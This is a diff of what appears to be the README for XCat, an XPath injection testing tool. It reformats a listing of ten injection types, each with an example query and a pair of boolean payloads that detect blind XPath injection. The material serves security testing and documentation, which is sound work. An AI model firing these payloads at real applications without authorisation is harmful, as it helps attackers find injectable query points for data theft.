@@ -117,56 +117,56 @@ XCat will use to test if this injection works.
 ```shell
 $ xcat injections
 Supports 10 injections:
- - Name: integer
-   Example: /lib/book[id=?]
-   Tests:
-   - ? and 1=1 = passes
-   - ? and 1=2 = fails
- - Name: string - single quote
-   Example: /lib/book[name='?']
-   Tests:
-   - ?' and '1'='1 = passes
-   - ?' and '1'='2 = fails
- - Name: string - double quote
-   Example: /lib/book[name="?"]
-   Tests:
-   - ?" and "1"="1 = passes
-   - ?" and "1"="2 = fails
- - Name: attribute name - prefix
-   Example: /lib/book[?=value]
-   Tests:
-   - 1=1 and ? = passes
-   - 1=2 and ? = fails
- - Name: attribute name - postfix
-   Example: /lib/book[?=value]
-   Tests:
-   - ? and not 1=2 and ? = passes
-   - ? and 1=2 and ? = fails
- - Name: element name - prefix
-   Example: /lib/something?/
-   Tests:
-   - .[true()]/? = passes
-   - .[false()]/? = fails
- - Name: element name - postfix
-   Example: /lib/?something
-   Tests:
-   - ?[true()] = passes
-   - ?[false()] = fails
- - Name: function call - last string parameter - single quote
-   Example: /lib/something[function(?)]
-   Tests:
-   - ?') and true() and string('1'='1 = passes
-   - ?') and false() and string('1'='1 = fails
- - Name: function call - last string parameter - double quote
-   Example: /lib/something[function(?)]
-   Tests:
-   - ?") and true() and string("1"="1 = passes
-   - ?") and false() and string("1"="1 = fails
- - Name: other elements - last string parameter - double quote
-   Example: /lib/something[function(?) and false()] | //*[?]
-   Tests:
-   - ?") and false()] | //*[true() and string("1"="1 = passes
-   - ?") and false()] | //*[false() and string("1"="1 = fails
+Name: integer
+ Example: /lib/book[id=?]
+ Tests:
+   ? and 1=1 = passes
+   ? and 1=2 = fails
+Name: string - single quote
+ Example: /lib/book[name='?']
+ Tests:
+   ?' and '1'='1 = passes
+   ?' and '1'='2 = fails
+Name: string - double quote
+ Example: /lib/book[name="?"]
+ Tests:
+   ?" and "1"="1 = passes
+   ?" and "1"="2 = fails
+Name: attribute name - prefix
+ Example: /lib/book[?=value]
+ Tests:
+   1=1 and ? = passes
+   1=2 and ? = fails
+Name: attribute name - postfix
+ Example: /lib/book[?=value]
+ Tests:
+   ? and not 1=2 and ? = passes
+   ? and 1=2 and ? = fails
+Name: element name - prefix
+ Example: /lib/something?/
+ Tests:
+   .[true()]/? = passes
+   .[false()]/? = fails
+Name: element name - postfix
+ Example: /lib/?something
+ Tests:
+   ?[true()] = passes
+   ?[false()] = fails
+Name: function call - last string parameter - single quote
+ Example: /lib/something[function(?)]
+ Tests:
+   ?') and true() and string('1'='1 = passes
+   ?') and false() and string('1'='1 = fails
+Name: function call - last string parameter - double quote
+ Example: /lib/something[function(?)]
+ Tests:
+   ?") and true() and string("1"="1 = passes
+   ?") and false() and string("1"="1 = fails
+Name: other elements - last string parameter - double quote
+ Example: /lib/something[function(?) and false()] | //*[?]
+ Tests:
+   ?") and false()] | //*[true() and string("1"="1 = passes
+   ?") and false()] | //*[false() and string("1"="1 = fails
 ```
 
 # ip
